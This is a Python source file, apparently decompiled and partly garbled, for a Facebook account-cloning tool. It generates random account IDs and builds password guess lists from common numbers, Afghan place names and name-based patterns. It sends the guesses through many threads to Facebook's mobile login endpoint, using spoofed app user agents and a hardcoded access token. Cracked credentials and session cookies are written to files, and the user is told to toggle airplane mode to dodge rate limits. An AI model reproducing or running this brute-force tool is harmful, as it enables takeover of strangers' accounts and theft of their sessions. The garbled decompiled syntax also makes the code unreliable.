    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    os.system('clear')
    print(logo)
    print(f'''{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ''')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : '))
    clear()
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m1\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m1\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m2\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m2\x1b[38;5;196m)\n\x1b[1;31m[\x1b[1;37m3\x1b[1;31m]\x1b[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM\x1b[38;5;46m3\x1b[38;5;196m)')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;37m CHOICE  : ')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(logo)
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \x1b[1;37m:\x1b[38;5;46m {code} ''')
        print(f'''\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \x1b[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \x1b[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ''')
        print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                psx,
                uid,
                'afghan',
                'afghan12345',
                'afghan123',
                '600700',
                'afghanistan',
                'afghan1122',
                '500500',
                '100200',
                '10002000',
                '900900',
                'kabul123',
                'Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹',
                'Û±Û³Û³Û³ÛµÛ¶',
                'afghan1234',
                'kabul1234',
                'khankhan',
                'khan123',
                'khan123456',
                'khan786']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
                habib.submit(rndm2, uid, passlist)
            if mthd in ('3', '03'):
                habib.submit(rndm3, uid, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    print('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    print('\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input('\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()


def crack_file():
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;92m[\x1b[92;1m+\x1b[1;92m] Put File Example :  /sdcard/Name.txt')
    o = input('\x1b[1;92m[\x1b[92;1m+\x1b[1;92m] INPut FILE NAME  : \x1b[92;1m ')
    clear()
    print(logo)
    lin = open(o).read().splitlines()
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    animation(' FILE NOT FOUND')
    time.sleep(2)
    back()
    for xid in lin:
        id.append(xid)
        setting()
        clear()
        return None


def setting():
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;92m[\x1b[92;1m1\x1b[1;92m] \x1b[0;92mCLONING FOR ONLY OLD IDz')
    print('\x1b[1;92m[\x1b[92;1m2\x1b[1;92m] CLONING FOR ONLY NEW IDz')
    print('\x1b[1;92m[\x1b[92;1m3\x1b[1;92m] \x1b[0;92mCLONING FOR MIX IDz')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    hu = input('\x1b[1;92m[\x1b[92;1m+\x1b[1;92m]CHOOSE :\x1b[92;1m ')
    clear()
    print(logo)
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
            if hu in ('2', '02'):
                muda = []
                for bacot in sorted(id):
                    muda.append(bacot)
                    bcm = len(muda)
                    bcmi = bcm - 1
                    for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -= 1
                        if hu in ('3', '03'):
                            for bacot in id:
                                xx = random.randint(0, len(id2))
                                id2.insert(xx, bacot)
                                for bacot in id:
                                    xx = random.randint(0, len(id2))
                                    id2.insert(xx, bacot)
                                    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                    print('\x1b[1;92m[\x1b[92;1m1\x1b[1;92m] METHOD 1\x1b[1;96m<>[M]')
                                    print('\x1b[1;92m[\x1b[92;1m2\x1b[1;92m] METHOD 2\x1b[1;95m<>[M-Basic] ')
                                    print('\x1b[1;92m[\x1b[92;1m3\x1b[1;92m] METHOD 3\x1b[1;92m<>[Alpha]')
                                    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                    hc = input('\x1b[1;92m[\x1b[92;1m•\x1b[1;92m] CHOOSE : ')
                                    if hc in ('1', '01'):
                                        method.append('mobile')
    if hc in ('2', '02'):
        method.append('free')
    if hc in ('3', '03'):
        method.append('touch')
    method.append('mobile')
    passwrd()
    exit()


def passwrd():
    os.system('clear')
    print(logo)
    print('\x1b[1;31m[\x1b[1;37m+\x1b[1;31m] \x1b[1;92mUSER COUNTRY\x1b[1;91m    \x1b[0;97m:\x1b[38;5;208m ' + uname)
    print('\x1b[1;31m[\x1b[1;37m+\x1b[1;31m] \x1b[1;92mYOUR TOTAL UID  \x1b[0;97m:\x1b[1;96m', str(len(id)))
    print('\x1b[1;31m[\x1b[1;37m+\x1b[1;31m]\x1b[1;92m TURN \x1b[1;37m[\x1b[1;92mON\x1b[1;31m/\x1b[1;92mOFF\x1b[1;37m]\x1b[1;92m AIRPLANE MODE EVERY 5 MIN')
    print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    pool = tred(max_workers = 30)
    for yuzong in id2:
        nmf = yuzong.split('|')[1].lower()
        idf = yuzong.split('|')[0]
        frs = nmf.split(' ')[0]
        pwv = []
        if len(nmf) < 6:
            if len(frs) < 3:
                pass
            pwv.append(frs + '12')
            pwv.append(frs + '123')
            pwv.append(frs + '1234')
            pwv.append(frs + '12345')
            pwv.append(frs + '123456')
            pwv.append(nmf)
            pwv.append(frs + '@#')
            pwv.append(frs + '999')
            pwv.append(frs + '@123')
            pwv.append(frs + '222')
            pwv.append(frs + '@')
            pwv.append(frs + '@@')
            pwv.append(frs + '@@@')
            pwv.append(frs + '420')
            pwv.append(frs + '##')
            pwv.append(frs + '1122')
            pwv.append(frs + '121')
            pwv.append(frs + '111')
            pwv.append(frs + '222')
            pwv.append(frs + '333')
        if len(frs) < 3:
            pwv.append(nmf)
        pwv.append(frs + '12')
        pwv.append(frs + '123')
        pwv.append(frs + '1234')
        pwv.append(frs + '12345')
        pwv.append(frs + '123456')
        pwv.append(nmf)
        pwv.append(frs + '@#')
        pwv.append(frs + '999')
        pwv.append(frs + '@123')
        pwv.append(frs + '222')
        pwv.append(frs + '@')
        pwv.append(frs + '@@')
        pwv.append(frs + '@@@')
        pwv.append(frs + '420')
        pwv.append(frs + '##')
        pwv.append(frs + '1122')
        pwv.append(frs + '121')
        pwv.append(frs + '111')
        pwv.append(frs + '222')
        pwv.append(frs + '333')
        if 'ya' in pwpluss:
            for xpwd in pwnya:
                pwv.append(xpwd)
                if 'mobile' in method:
                    pool.submit(crack, idf, pwv)
        if 'free' in method:
            pool.submit(crackfree, idf, pwv)
        if 'touch' in method:
            pool.submit(cracktouch, idf, pwv)
        if 'mbasic' in method:
            pool.submit(crackfree, idf, pwv)
        pool.submit(crackfree, idf, pwv)
        None(None, None)
        if not None:
            pass
    print('\n\x1b[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;92m[\x1b[92;1m+\x1b[1;92m] CLONING COMPLETE TIME :\x1b[1;92m' + time.strftime('%H:%M') + ' ' + tag)
    print('\x1b[1;92m[\x1b[92;1m•\x1b[1;92m] OK :\x1b[0;92m %s ' % ok)
    print('\x1b[1;92m[\x1b[92;1m+\x1b[1;92m] CP :\x1b[0;93m %s ' % cp)
    print('\n\x1b[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    woi = input('\x1b[1;92m[\x1b[92;1m+\x1b[1;92m] \x1b[1;37m ENTER TO BACK')
    os.system('python File-V5.py')
    exit()


def sawg():
    model = random.choice([
        'Redmi 6',
        'Redmi 7',
        'Redmi 8',
        'Redmi 5',
        'Redmi 4',
        'Redmi 3',
        'Redmi 2'])
    bal = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;FBDM/' + '{density=2.75,width=1080,height=2168}' + f''';FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a:;]'''
    return bal


def FM1():
    model = random.choice([
        'Redmi 6',
        'Redmi 7',
        'Redmi 8',
        'Redmi 5',
        'Redmi 4',
        'Redmi 3',
        'Redmi 2'])
    bal = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;FBDM/' + '{density=2.75,width=1080,height=2168}' + f''';FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a:;]'''
    return bal


def FM2():
    model = random.choice([
        'SM-G920F',
        'NRD90M',
        'SM-T535',
        'LRX22G',
        'SM-T231',
        'KOT49H',
        'SM-J320F',
        'LMY47V',
        'GT-I9190',
        'KOT49H',
        'GT-N7100',
        'KOT49H',
        'SM-T561',
        'KTU84P',
        'GT-N7100',
        'KOT49H',
        'GT-I9500',
        'LRX22C',
        'SM-J320F',
        'LMY47V',
        'SM-G930F',
        'NRD90M',
        'SM-J320F',
        'LMY47V',
        'SM-J510FN',
        'NMF26X',
        'GT-P5100',
        'IML74K',
        'SM-J320F',
        'LMY47V',
        'GT-N8000',
        'JZO54K',
        'SM-T531',
        'LRX22G',
        'SPH-L720',
        'KOT49H',
        'GT-I9500',
        'JDQ39',
        'SM-G935F',
        'NRD90M',
        'SM-T561',
        'KTU84P',
        'SM-T531',
        'KOT49H',
        'SM-J320FN',
        'LMY47V',
        'SM-A500F',
        'MMB29M',
        'SM-A500FU',
        'MMB29M',
        'SM-A500F',
        'MMB29M',
        'SM-T311',
        'KOT49H',
        'SM-T531',
        'LRX22G',
        'SM-J320F',
        'LMY47V',
        'SM-J320FN',
        'LMY47V',
        'SM-J320F',
        'LMY47V',
        'GT-P5210',
        'KOT49H',
        'SM-T230',
        'KOT49H',
        'GT-I9192',
        'KOT49H',
        'SM-T235',
        'KOT4',
        'GT-N7100',
        'KOT49H',
        'SM-A500F',
        'LRX22G',
        'SM-A500F',
        'MMB29M',
        'GT-N7100',
        'KOT49H',
        'SM-G920F',
        'MMB29K',
        'SM-J510FN',
        'NMF26X',
        'GT-N8000',
        'JZO54K',
        'SM-J320FN',
        'LMY47V',
        'SM-J320FN',
        'LMY47V',
        'SM-A500H',
        'MMB29M',
        'GT-I9300',
        'JSS15J',
        'GT-I9500',
        'LRX22C',
        'SM-J320F',
        'LMY4',
        'SM-J510FN',
        'NMF26X',
        'SM-A500F',
        'MMB29M',
        'GT-N8000',
        'KOT49H',
        'SM-T561',
        'KTU84P',
        'SM-G900F',
        'KOT49H',
        'GT-S7390',
        'JZO54K',
        'SM-J320F',
        'LMY47V',
        'GT-P5100',
        'JZO54K',
        'SM-A500FU',
        'MMB29M',
        'SM-G930F',
        'NRD90M',
        'SM-J510FN',
        'NMF26X',
        'SM-T561',
        'KTU84P',
        'GT-N8000',
        'KOT49H',
        'SM-T531',
        'LRX22G',
        'SM-J510FN',
        'MMB29M',
        'SM-J510FN',
        'NMF26X',
        'SM-J320F',
        'LMY47V',
        'GT-P5110',
        'JDQ39',
        'GT-I9301I',
        'KOT49H',
        'SM-A500F',
        'LRX22G',
        'SM-G930F',
        'NRD90M',
        'SM-T311',
        'KOT4',
        'GT-P5200',
        'KOT49H',
        'GT-I9301I',
        'KOT49H',
        'SM-J320M',
        'LMY47V',
        'SM-T531',
        'LRX22G',
        'SM-T820',
        'NRD90M',
        'GT-I9192',
        'KOT49H',
        'SM-G935F',
        'MMB29K',
        'SM-J701F',
        'NRD90M;',
        'GT-I9301I',
        'KOT4',
        'SM-J320FN',
        'LMY47V',
        'SM-T111',
        'JDQ39',
        'SM-A500F',
        'MMB29M',
        'SM-J510FN',
        'NMF2',
        'SM-T705',
        'LRX22G',
        'SM-G920F',
        'NRD90M',
        'GT-N5100',
        'JZO54K',
        'GT-I9300I',
        'KTU84P',
        'GT-I9300I',
        'KTU84P',
        'GT-N8000',
        'KOT49H',
        'GT-N8000',
        'KOT49H',
        'SM-A500F',
        'MMB29M',
        'GT-I9190',
        'KOT49H',
        'SM-J510FN',
        'NMF26X',
        'SM-J320F',
        'LMY47V',
        'GT-P5100',
        'JDQ39',
        'GT-I9300I',
        'KTU84P',
        'GT-N5100',
        'JZO54K',
        'GT-N8000',
        'KOT49H',
        'GT-I9500',
        'LRX22C',
        'SM-J320FN',
        'LMY47V',
        'SM-A500F',
        'MMB29M',
        'GT-N8000',
        'JZO54K',
        'SM-T805',
        'LRX22G',
        'SM-T231',
        'KOT49H',
        'GT-N5100',
        'JZO54K',
        'SM-J320H',
        'LMY47V',
        'SM-T231',
        'KOT49H',
        'SM-G930F',
        'NRD90M',
        'SM-G935F',
        'NRD90M',
        'SM-T310',
        'KOT49H',
        'GT-N8000',
        'KOT49H',
        'GT-I9300I',
        'KTU84P',
        'SM-G920F',
        'NRD90M',
        'SM-J510FN',
        'NMF26X',
        'SM-T705',
        'LRX22G;',
        'GT-P3110',
        'JZO54K',
        'GT-I9192',
        'KOT49H',
        'SM-J320F',
        'LMY47V',
        'SM-G920F',
        'NRD90M',
        'GT-I9300',
        'IMM76D',
        'SM-G950F',
        'NRD90M',
        'SM-J320F',
        'LMY47V',
        'SM-J510FN',
        'NMF26X;',
        'SM-J701F',
        'NRD90M',
        'SM-A500F',
        'LRX22G',
        'SM-T231',
        'KOT49H',
        'SM-T311',
        'KOT49H',
        'SM-J320FN',
        'LMY47V',
        'GT-P5210',
        'KOT49H',
        'SM-T805',
        'LRX22G',
        'GT-I9500',
        'LRX22C',
        'GT-P5200',
        'KOT49H',
        'GT-I9301I',
        'KOT49H',
        'GT-I9300',
        'JSS15J',
        'GT-N7100',
        'KOT49H',
        'SM-T531',
        'LRX22G',
        'SM-T820',
        'NRD90M',
        'SM-T315',
        'JDQ39',
        'SM-J320F',
        'LMY47V',
        'GT-I9190',
        'KOT49H',
        'GT-P5220',
        'JDQ39',
        'SM-T525',
        'KOT49H',
        'SM-T555',
        'LRX22G',
        'GT-I9190',
        'KOT49H',
        'SM-J510FN',
        'NMF26X;',
        'SM-A500F',
        'MMB29M',
        'GT-I9192',
        'KOT49H',
        'GT-P5100',
        'JDQ',
        'SM-T311',
        'KOT49H'])
    bal = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    return bal


def FM3():
    application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
    application_version_code = str(random.randint(0, 999999999))
    android_version = str(random.randrange(6, 13))
    numbr = f'''{random.randint(111111, 999999)}.{random.randint(111, 999)}'''
    build = random.choice([
        'OPD2302.',
        'SP1A.',
        'TP2A.',
        'SP1A.',
        'SP1A.',
        'TP1A.',
        'TP1A.',
        'SP1A.',
        'TP1A.',
        'RKQ1.',
        'TP1A.',
        'TP1A.',
        'RP1A.',
        'RP1A.',
        'RKQ1.',
        'TQ3A.',
        'TD2A.',
        'TD4A.',
        'TQ3A.',
        'TP1A.',
        'TP1A.',
        'SP2A.',
        'SD2A.',
        'SQ3A.',
        'RD2A.',
        'RQ3A.',
        'RP1A.',
        'QD4A.',
        'QQ3A.',
        'QP1A.',
        'PQ3B.',
        'PD2A.',
        'PPR2.',
        'PPR1.',
        'OPM8.',
        'OPR6.'])
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    ua = f'''Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; BLU Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/''' + '{density=1.5,width=720,height=1208};' + f'''FBLC/en_US;FBRV;FBRV/{str(application_version_code)};FBCR/HO"+"T_m"+"obi"+"le;FBMF/So"+"ny;FBBD/So"+"ny;FBPN/{str(fbs)};FBDV/D2"+"5"+"02;FBSV/5."+"1.1;nullFBCA/armeabi-v7a:armeabi;]'''
    return ua


def RM1():
    ua = '[FBAN/Orca-Android;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(4000, 5000)) + ';FBBV/' + str(random.randint(4000000, 5000000)) + ';[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    return ua


def u_a():
    g = '[FBAN/Orca-Android;FBAV/91.0.0.50.16;FBBV/46154306;FBDM/{density=3.5,width=720,height=1280};FBLC/en_GB;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A500H;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
    return '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';' + g


def u_a1():
    g = '[FBAN/Orca-Android;FBAV/91.0.0.50.16;FBBV/46154306;FBDM/{density=3.5,width=720,height=1280};FBLC/pl_PL;FBCR/Wing Alpha;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A500H;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
    return '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';' + g

uaxx = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/386.0.0.35.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/402949595;FBCR/AT&amp;amp-T;FBMF/motorola;FBBD/motorola;FBDV/moto g go;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1504};FB_FW/1;FBRV/0;]'

def rndm1(uid, passlist):
    global loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    sys.stdout.write(f'''\r\r{B}[{G}ALONE[💚]<>M1{B}]{G}<>{B}[{bo}%s{B}]{G}<>{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': sawg(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print(f'''\r\r{R}[{G}ALONE-OK{R}]{G} ''' + uid + ' | ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r{B}[{Y}ALONE-CP{B}]{Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e

uaxx = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'

def rndm2(uid, passlist):
    global loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    sys.stdout.write(f'''\r\r{B}[{G}ALONE[💚]<>M2{B}]{G}<>{B}[{bo}%s{B}]{G}<>{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': FM1(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print(f'''\r\r{R}[{G}ALONE-OK{R}]{G} ''' + uid + ' | ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r{B}[{Y}ALONE-CP{B}]{Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
